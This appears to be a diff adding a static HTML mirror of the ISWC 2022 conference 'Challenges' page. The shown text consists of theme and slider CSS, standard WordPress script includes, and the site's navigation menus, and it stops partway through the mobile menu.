.n-uc-13f534e3e8fa1-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-10e6a17eed4ba{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-12e7e99597a66{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-12895d9ec26d5{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-12e2bf9249b47{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1e4f62ee275eb-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-14d95d0f89983-inner{text-align:center;--ssselfalign:center;}div#n2-ss-4 .n-uc-14d95d0f89983{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1d85941085228{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-187556ec187db-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-14895dd839786{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1af032d147d2d{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1d95b9f87f689-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-12370427bf092{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-110158b2af952{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-139d094292238{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-10f5f2037ea6a-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-1128283a68263-inner{text-align:center;--ssselfalign:center;}div#n2-ss-4 .n-uc-1128283a68263{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-5r8SGxz2UZfk{max-width:230px}div#n2-ss-4 .n-uc-106289ccb07b2{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-15c84fcd75e98-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-19e7322032fd9{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1310a1e1216d1{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1daeacbd4ec53{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1962251824ae2-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-1d5482854f375{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1824f2300d924{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-16d86ee31826a-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-1b0dafc671f80{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1fe3733430bc9{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-1ab5a9a53912a-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-1381b0f95e42b-inner{text-align:center;--ssselfalign:center;}div#n2-ss-4 .n-uc-1381b0f95e42b{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-nHXLRly593S7{max-width:225px}div#n2-ss-4 .n-uc-1ba8941ee4ddf{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-13a465b66c0a8-inner > .n2-ss-layer-row-inner{flex-wrap:wrap;}div#n2-ss-4 .n-uc-18baf78d0d284{width:calc(100% - 20px)}div#n2-ss-4 .n-uc-102893308dcc5{width:calc(100% - 20px)}div#n2-ss-4 [data-hide-mobileportrait="1"]{display: none !important;}div#n2-ss-4 .nextend-arrow img{width: 16px}}</style>
+<!--[if lt IE 8]>
+<script src="https://iswc2022.semanticweb.org/wp-includes/js/json2.min.js?ver=2015-05-03" id="json2-js"></script>
+<![endif]-->
+<script src="./../../wp-content/plugins/wp-file-upload/js/wordpress_file_upload_functions.js?ver=bb270fba1988038f5680f75b7475565e" id="wordpress_file_upload_script-js"></script>
+<script src="./../../wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="./../../wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script src="./../../wp-includes/js/jquery/ui/core.min.js?ver=1.13.2" id="jquery-ui-core-js"></script>
+<script src="./../../wp-includes/js/jquery/ui/datepicker.min.js?ver=1.13.2" id="jquery-ui-datepicker-js"></script>
+<script id="jquery-ui-datepicker-js-after">jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Close","currentText":"Today","monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Previous","dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"dateFormat":"yy年mm月d日","firstDay":1,"isRTL":false});});</script>
+<script src="./../../wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.js?ver=bb270fba1988038f5680f75b7475565e" id="jquery-ui-timepicker-addon-js-js"></script>
+<link rel="https://api.w.org/" href="./../wp-json/index.html">
+<link rel="alternate" type="application/json" href="./../wp-json/wp/v2/pages/1217/index.html">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="./../../xmlrpc.php?rsd">
+<link rel="canonical" href="./index.html">
+<link rel="alternate" type="application/json+oembed" href="./../wp-json/oembed/1.0/embed/index.html?url=https%3A%2F%2F%2Findex.php%2Fchallenges%2F">
+<link rel="alternate" type="text/xml+oembed" href="./../wp-json/oembed/1.0/embed/index.html?url=https%3A%2F%2F%2Findex.php%2Fchallenges%2F#038;format=xml">
+<!-- Enter your scripts here --><meta name="generator" content="Elementor 3.17.3; features: e_dom_optimization, e_optimized_assets_loading, e_optimized_css_loading, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-auto">
+<link rel="icon" href="./../../wp-content/uploads/2022/01/cropped-截屏2022-01-06-下午9.24.23-32x32.jpg" sizes="32x32">
+<link rel="icon" href="./../../wp-content/uploads/2022/01/cropped-截屏2022-01-06-下午9.24.23-192x192.jpg" sizes="192x192">
+<link rel="apple-touch-icon" href="./../../wp-content/uploads/2022/01/cropped-截屏2022-01-06-下午9.24.23-180x180.jpg">
+<meta name="msapplication-TileImage" content="https://iswc2022.semanticweb.org/wp-content/uploads/2022/01/cropped-截屏2022-01-06-下午9.24.23-270x270.jpg">
+<!-- OceanWP CSS -->
+<style type="text/css">/* General CSS */a{color:#116ebf}a .owp-icon use{stroke:#116ebf}.site-breadcrumbs,.background-image-page-header .site-breadcrumbs{color:#353535}/* Header CSS */#site-header,.has-transparent-header .is-sticky #site-header,.has-vh-transparent .is-sticky #site-header.vertical-header,#searchform-header-replace{background-color:#474747}#site-header.has-header-media .overlay-header-media{background-color:rgba(0,0,0,0.5)}#site-logo #site-logo-inner a img,#site-header.center-header #site-navigation-wrap .middle-site-logo a img{max-width:162px}#site-header #site-logo #site-logo-inner a img,#site-header.center-header #site-navigation-wrap .middle-site-logo a img{max-height:84px}#searchform-dropdown input{background-color:#ffffff}.effect-one #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:after,.effect-three #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:after,.effect-five #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:before,.effect-five #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:after,.effect-nine #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:before,.effect-nine #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:after{background-color:#2386dd}.effect-four #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:before,.effect-four #site-navigation-wrap .dropdown-menu >li >a.menu-link >span:after,.effect-seven #site-navigation-wrap .dropdown-menu >li >a.menu-link:hover >span:after,.effect-seven #site-navigation-wrap .dropdown-menu >li.sfHover >a.menu-link >span:after{color:#2386dd}.effect-seven #site-navigation-wrap .dropdown-menu >li >a.menu-link:hover >span:after,.effect-seven #site-navigation-wrap .dropdown-menu >li.sfHover >a.menu-link >span:after{text-shadow:10px 0 #2386dd,-10px 0 #2386dd}#site-navigation-wrap .dropdown-menu >li >a{padding:0 13px}#site-navigation-wrap .dropdown-menu >li >a,.oceanwp-mobile-menu-icon a,#searchform-header-replace-close{color:#ffffff}#site-navigation-wrap .dropdown-menu >li >a .owp-icon use,.oceanwp-mobile-menu-icon a .owp-icon use,#searchform-header-replace-close .owp-icon use{stroke:#ffffff}#site-navigation-wrap .dropdown-menu >li >a:hover,.oceanwp-mobile-menu-icon a:hover,#searchform-header-replace-close:hover{color:#ffffff}#site-navigation-wrap .dropdown-menu >li >a:hover .owp-icon use,.oceanwp-mobile-menu-icon a:hover .owp-icon use,#searchform-header-replace-close:hover .owp-icon use{stroke:#ffffff}#site-navigation-wrap .dropdown-menu >.current-menu-item >a,#site-navigation-wrap .dropdown-menu >.current-menu-ancestor >a,#site-navigation-wrap .dropdown-menu >.current-menu-item >a:hover,#site-navigation-wrap .dropdown-menu >.current-menu-ancestor >a:hover{color:#ffffff}/* Header Image CSS */#site-header{background-image:url(./../../wp-content/uploads/2021/10/cropped-cropped-srchttp___5b0988e595225.cdn_.sohucs.com_images_20200408_3e6e2fb065cb48c5958e62c9a21d87ba.jpegreferhttp___5b0988e595225.cdn_.sohucs.jpeg)}/* Footer Widgets CSS */#footer-widgets{background-color:#ffffff}#footer-widgets .footer-box a,#footer-widgets a{color:#dd3333}/* Footer Bottom CSS */#footer-bottom,#footer-bottom p{color:#a3a3a3}</style>
+<script>(function(){this._N2=this._N2||{_r:[],_d:[],r:function(){this._r.push(arguments)},d:function(){this._d.push(arguments)}}}).call(window);</script><script src="./../../wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/n2.min.js?ver=78442573" defer async></script>
+<script src="./../../wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/smartslider-frontend.min.js?ver=78442573" defer async></script>
+<script src="./../../wp-content/plugins/smart-slider-3/Public/SmartSlider3/Slider/SliderType/Simple/Assets/dist/ss-simple.min.js?ver=78442573" defer async></script>
+<script src="./../../wp-content/plugins/smart-slider-3/Public/SmartSlider3/Widget/Arrow/ArrowImage/Assets/dist/w-arrow-image.min.js?ver=78442573" defer async></script>
+<script src="./../../wp-content/plugins/smart-slider-3/Public/SmartSlider3/Widget/Bullet/Assets/dist/w-bullet.min.js?ver=78442573" defer async></script>
+<script>_N2.r('documentReady',function(){_N2.r(["documentReady","smartslider-frontend","SmartSliderWidgetArrowImage","SmartSliderWidgetBulletTransition","ss-simple"],function(){new _N2.SmartSliderSimple('n2-ss-4',{"admin":false,"background.video.mobile":1,"loadingTime":2000,"alias":{"id":0,"smoothScroll":0,"slideSwitch":0,"scroll":1},"align":"normal","isDelayed":0,"responsive":{"mediaQueries":{"all":false,"desktopportrait":["(min-width: 1200px)"],"tabletportrait":["(orientation: landscape) and (max-width: 1199px) and (min-width: 901px)","(orientation: portrait) and (max-width: 1199px) and (min-width: 701px)"],"mobileportrait":["(orientation: landscape) and (max-width: 900px)","(orientation: portrait) and (max-width: 700px)"]},"base":{"slideOuterWidth":1000,"slideOuterHeight":300,"sliderWidth":1000,"sliderHeight":300,"slideWidth":1000,"slideHeight":300},"hideOn":{"desktopLandscape":false,"desktopPortrait":false,"tabletLandscape":false,"tabletPortrait":false,"mobileLandscape":false,"mobilePortrait":false},"onResizeEnabled":true,"type":"auto","sliderHeightBasedOn":"real","focusUser":1,"focusEdge":"auto","breakpoints":[{"device":"tabletPortrait","type":"max-screen-width","portraitWidth":1199,"landscapeWidth":1199},{"device":"mobilePortrait","type":"max-screen-width","portraitWidth":700,"landscapeWidth":900}],"enabledDevices":{"desktopLandscape":0,"desktopPortrait":1,"tabletLandscape":0,"tabletPortrait":1,"mobileLandscape":0,"mobilePortrait":1},"sizes":{"desktopPortrait":{"width":1000,"height":300,"max":3000,"min":1000},"tabletPortrait":{"width":701,"height":210,"customHeight":false,"max":1199,"min":701},"mobilePortrait":{"width":320,"height":96,"customHeight":false,"max":900,"min":320}},"overflowHiddenPage":0,"focus":{"offsetTop":"#wpadminbar","offsetBottom":""}},"controls":{"mousewheel":0,"touch":"horizontal","keyboard":1,"blockCarouselInteraction":1},"playWhenVisible":1,"playWhenVisibleAt":0.5,"lazyLoad":0,"lazyLoadNeighbor":0,"blockrightclick":0,"maintainSession":0,"autoplay":{"enabled":1,"start":1,"duration":3000,"autoplayLoop":1,"allowReStart":0,"pause":{"click":0,"mouse":"0","mediaStarted":0},"resume":{"click":1,"mouse":"0","mediaEnded":1,"slidechanged":0},"interval":1,"intervalModifier":"loop","intervalSlide":"current"},"perspective":1500,"layerMode":{"playOnce":0,"playFirstLayer":1,"mode":"skippable","inAnimation":"mainInEnd"},"bgAnimations":0,"mainanimation":{"type":"horizontal","duration":500,"delay":0,"ease":"easeOutQuad","shiftedBackgroundAnimation":0},"carousel":1,"initCallbacks":function(){new _N2.SmartSliderWidgetArrowImage(this);new _N2.SmartSliderWidgetBulletTransition(this,{"area":10,"dotClasses":"n2-style-785355f374be86c332d4665aae819858-dot ","mode":"","action":"click"})}})})});</script>
+</head>
+
+<body data-rsssl="1" class="page-template-default page page-id-1217 wp-custom-logo wp-embed-responsive oceanwp-theme dropdown-mobile no-header-border default-breakpoint content-full-width content-max-width page-header-disabled has-breadcrumbs elementor-default elementor-kit-261 elementor-page elementor-page-1217" itemscope="itemscope" itemtype="https://schema.org/WebPage">
+
+	
+	
+	<div id="outer-wrap" class="site clr">
+
+		<a class="skip-link screen-reader-text" href="#main">Skip to content</a>
+
+		
+		<div id="wrap" class="clr">
+
+			
+			
+<header id="site-header" class="minimal-header has-header-media effect-one clr" data-height="74" itemscope="itemscope" itemtype="https://schema.org/WPHeader" role="banner">
+
+	
+					
+			<div id="site-header-inner" class="clr container">
+
+				
+				
+
+<div id="site-logo" class="clr" itemscope itemtype="https://schema.org/Brand">
+
+	
+	<div id="site-logo-inner" class="clr">
+
+		<a href="./../../index.html" class="custom-logo-link" rel="home"><img width="532" height="146" src="./../../wp-content/uploads/2022/10/cropped-iswc-logo.png" class="custom-logo" alt="ISWC 2022" decoding="async" fetchpriority="high" srcset="./../../wp-content/uploads/2022/10/cropped-iswc-logo.png 532w, ./../../wp-content/uploads/2022/10/cropped-iswc-logo-300x82.png 300w" sizes="(max-width: 532px) 100vw, 532px"></a>
+	</div>
+<!-- #site-logo-inner -->
+
+	
+	
+</div>
+<!-- #site-logo -->
+
+			<div id="site-navigation-wrap" class="clr">
+			
+			
+			
+			<nav id="site-navigation" class="navigation main-navigation clr" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement" role="navigation">
+
+				<ul id="menu-main" class="main-menu dropdown-menu sf-menu">
+<li id="menu-item-50" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-50"><a href="./../../index.html" class="menu-link"><span class="text-wrap">Home</span></a></li>
+<li id="menu-item-2869" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2869"><a href="./../awards/index.html" class="menu-link"><span class="text-wrap">Awards</span></a></li>
+<li id="menu-item-49" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-49"><a href="./../dates/index.html" class="menu-link"><span class="text-wrap">Dates</span></a></li>
+<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children dropdown menu-item-48 nav-no-click">
+<a href="./../calls/index.html" class="menu-link"><span class="text-wrap">Calls<i class="nav-arrow fa fa-angle-down" aria-hidden="true" role="img"></i></span></a>
+<ul class="sub-menu">
+	<li id="menu-item-168" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-168"><a href="./../research-track/index.html" class="menu-link"><span class="text-wrap">Research Track</span></a></li>	<li id="menu-item-170" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-170"><a href="./../resources-track/index.html" class="menu-link"><span class="text-wrap">Resources Track</span></a></li>	<li id="menu-item-169" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-169"><a href="./../in-use-track/index.html" class="menu-link"><span class="text-wrap">In-Use Track</span></a></li>	<li id="menu-item-171" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-171"><a href="./../industry-track/index.html" class="menu-link"><span class="text-wrap">Industry Track</span></a></li>	<li id="menu-item-172" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-172"><a href="./../workshops-and-tutorials/index.html" class="menu-link"><span class="text-wrap">Workshops and Tutorials</span></a></li>	<li id="menu-item-173" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-173"><a href="./../posters-and-demos/index.html" class="menu-link"><span class="text-wrap">Posters and Demos</span></a></li>	<li id="menu-item-174" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-174"><a href="./../lightning-talks/index.html" class="menu-link"><span class="text-wrap">Lightning Talks</span></a></li>	<li id="menu-item-175" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-175"><a href="./../doctoral-consortium/index.html" class="menu-link"><span class="text-wrap">Doctoral Consortium</span></a></li>	<li id="menu-item-176" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-176"><a href="./../semantic-web-challenge-proposals/index.html" class="menu-link"><span class="text-wrap">Semantic Web Challenge Proposals</span></a></li>
+</ul>
+</li>
+<li id="menu-item-904" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children dropdown menu-item-904 nav-no-click">
+<a href="./../sponsorships/index.html" class="menu-link"><span class="text-wrap">Sponsorships<i class="nav-arrow fa fa-angle-down" aria-hidden="true" role="img"></i></span></a>
+<ul class="sub-menu">
+	<li id="menu-item-903" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-903"><a href="./../sponsorship-packages/index.html" class="menu-link"><span class="text-wrap">Sponsorship Packages</span></a></li>	<li id="menu-item-902" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-902"><a href="./../sponsors/index.html" class="menu-link"><span class="text-wrap">Sponsors</span></a></li>
+</ul>
+</li>
+<li id="menu-item-47" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children dropdown menu-item-47 nav-no-click">
+<a href="./../attending/index.html" class="menu-link"><span class="text-wrap">Attending<i class="nav-arrow fa fa-angle-down" aria-hidden="true" role="img"></i></span></a>
+<ul class="sub-menu">
+	<li id="menu-item-1521" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1521"><a href="./../registration/index.html" class="menu-link"><span class="text-wrap">Registration</span></a></li>	<li id="menu-item-1647" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1647"><a href="./../grants/index.html" class="menu-link"><span class="text-wrap">Grants</span></a></li>	<li id="menu-item-1476" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1476"><a href="./../joining-remotely/index.html" class="menu-link"><span class="text-wrap">Joining Remotely</span></a></li>
+</ul>
+</li>
+<li id="menu-item-46" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children dropdown menu-item-46 nav-no-click">
+<a href="./../authors/index.html" class="menu-link"><span class="text-wrap">Authors<i class="nav-arrow fa fa-angle-down" aria-hidden="true" role="img"></i></span></a>
+<ul class="sub-menu">
+	<li id="menu-item-689" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-689"><a href="./../standard-submission-guide/index.html" class="menu-link"><span class="text-wrap">Standard Submission Guide</span></a></li>	<li id="menu-item-688" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-688"><a href="./../html-submission-guide/index.html" class="menu-link"><span class="text-wrap">HTML Submission Guide</span></a></li>
+</ul>
+</li>
+<li id="menu-item-45" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children dropdown menu-item-45 nav-no-click">
+<a href="./../programs/index.html" class="menu-link"><span class="text-wrap">Program<i class="nav-arrow fa fa-angle-down" aria-hidden="true" role="img"></i></span></a>
+<ul class="sub-menu">
+	<li id="menu-item-1956" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1956"><a href="./../conference/index.html" class="menu-link"><span class="text-wrap">Conference</span></a></li>	<li id="menu-item-2145" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2145"><a href="./../panel/index.html" class="menu-link"><span class="text-wrap">Panel</span></a></li>	<li id="menu-item-939" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-939"><a href="./../keynote-speakers/index.html" class="menu-link"><span class="text-wrap">Keynote Speakers</span></a></li>	<li id="menu-item-1520" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1520"><a href="./../accepted-papers/index.html" class="menu-link"><span class="text-wrap">Accepted Papers</span></a></li>	<li id="menu-item-1219" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-1217 current_page_item menu-item-1219"><a href="./index.html" class="menu-link"><span class="text-wrap">Challenges</span></a></li>	<li id="menu-item-1301" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1301"><a href="./../tutorials/index.html" class="menu-link"><span class="text-wrap">Tutorials</span></a></li>	<li id="menu-item-1300" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1300"><a href="./../workshops/index.html" class="menu-link"><span class="text-wrap">Workshops</span></a></li>	<li id="menu-item-1586" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1586"><a href="./../posters-and-demos-2/index.html" class="menu-link"><span class="text-wrap">Posters and Demos</span></a></li>	<li id="menu-item-1438" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1438"><a href="./../doctoral-consortium-2/index.html" class="menu-link"><span class="text-wrap">Doctoral Consortium</span></a></li>	<li id="menu-item-2267" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2267"><a href="./../proceedings/index.html" class="menu-link"><span class="text-wrap">Proceedings</span></a></li>
+</ul>
+</li>
+<li id="menu-item-469" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-469">
+<a class="menu-link"><span class="text-wrap">Organization<i class="nav-arrow fa fa-angle-down" aria-hidden="true" role="img"></i></span></a>
+<ul class="sub-menu">
+	<li id="menu-item-202" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-202"><a href="./../organizing-committee/index.html" class="menu-link"><span class="text-wrap">Organizing Committee</span></a></li>	<li id="menu-item-201" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-201"><a href="./../research-track-pc/index.html" class="menu-link"><span class="text-wrap">Research Track PC</span></a></li>	<li id="menu-item-199" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-199"><a href="./../resource-track-pc/index.html" class="menu-link"><span class="text-wrap">Resource Track PC</span></a></li>	<li id="menu-item-200" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-200"><a href="./../in-use-track-pc/index.html" class="menu-link"><span class="text-wrap">In-Use Track PC</span></a></li>	<li id="menu-item-198" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-198"><a href="./../industry-track-pc/index.html" class="menu-link"><span class="text-wrap">Industry Track PC</span></a></li>	<li id="menu-item-197" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-197"><a href="./../poster-demos-track-pc/index.html" class="menu-link"><span class="text-wrap">Poster &#038; Demo Track PC</span></a></li>	<li id="menu-item-196" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-196"><a href="./../doctoral-consortium-program-committee/index.html" class="menu-link"><span class="text-wrap">Doctoral Consortium PC</span></a></li>
+</ul>
+</li>
+<li id="menu-item-375" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-375"><a href="./../code-of-conduct/index.html" class="menu-link"><span class="text-wrap">Code of Conduct</span></a></li>
+<li id="menu-item-1863" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1863"><a href="./../job-postings/index.html" class="menu-link"><span class="text-wrap">Job Postings/Fair</span></a></li>
+</ul>
+			</nav><!-- #site-navigation -->
+
+			
+			
+					</div>
+<!-- #site-navigation-wrap -->
+			
+		
+	
+				
+	
+	<div class="oceanwp-mobile-menu-icon clr mobile-right">
+
+		
+		
+		
+		<a href="./../../index.html#mobile-menu-toggle" class="mobile-menu" aria-label="Mobile Menu">
+							<i class="fa fa-bars" aria-hidden="true"></i>
+								<span class="oceanwp-text">Menu</span>
+				<span class="oceanwp-close-text">Close</span>
+						</a>
+
+		
+		
+		
+	</div>
+<!-- #oceanwp-mobile-menu-navbar -->
+
+	
+
+			</div>
+<!-- #site-header-inner -->
+
+			
+<div id="mobile-dropdown" class="clr">
+
+	<nav class="clr" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+
+		<ul id="menu-main-1" class="menu">
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-50"><a href="./../../index.html">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2869"><a href="./../awards/index.html">Awards</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-49"><a href="./../dates/index.html">Dates</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-48">
+<a href="./../calls/index.html">Calls</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-168"><a href="./../research-track/index.html">Research Track</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-170"><a href="./../resources-track/index.html">Resources Track</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-169"><a href="./../in-use-track/index.html">In-Use Track</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-171"><a href="./../industry-track/index.html">Industry Track</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-172"><a href="./../workshops-and-tutorials/index.html">Workshops and Tutorials</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-173"><a href="./../posters-and-demos/index.html">Posters and Demos</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-174"><a href="./../lightning-talks/index.html">Lightning Talks</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-175"><a href="./../doctoral-consortium/index.html">Doctoral Consortium</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-176"><a href="./../semantic-web-challenge-proposals/index.html">Semantic Web Challenge Proposals</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-904">
+<a href="./../sponsorships/index.html">Sponsorships</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-903"><a href="./../sponsorship-packages/index.html">Sponsorship Packages</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-902"><a href="./../sponsors/index.html">Sponsors</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-47">
+<a href="./../attending/index.html">Attending</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1521"><a href="./../registration/index.html">Registration</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1647"><a href="./../grants/index.html">Grants</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1476"><a href="./../joining-remotely/index.html">Joining Remotely</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-46">
+<a href="./../authors/index.html">Authors</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-689"><a href="./../standard-submission-guide/index.html">Standard Submission Guide</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-688"><a href="./../html-submission-guide/index.html">HTML Submission Guide</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-45">
+<a href="./../programs/index.html">Program</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1956"><a href="./../conference/index.html">Conference</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2145"><a href="./../panel/index.html">Panel</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-939"><a href="./../keynote-speakers/index.html">Keynote Speakers</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1520"><a href="./../accepted-papers/index.html">Accepted Papers</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-1217 current_page_item menu-item-1219"><a href="./index.html" aria-current="page">Challenges</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1301"><a href="./../tutorials/index.html">Tutorials</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1300"><a href="./../workshops/index.html">Workshops</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1586"><a href="./../posters-and-demos-2/index.html">Posters and Demos</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1438"><a href="./../doctoral-consortium-2/index.html">Doctoral Consortium</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2267"><a href="./../proceedings/index.html">Proceedings</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-469">
+<a>Organization</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-202"><a href="./../organizing-committee/index.html">Organizing Committee</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-201"><a href="./../research-track-pc/index.html">Research Track PC</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-199"><a href="./../resource-track-pc/index.html">Resource Track PC</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-200"><a href="./../in-use-track-pc/index.html">In-Use Track PC</a></li>
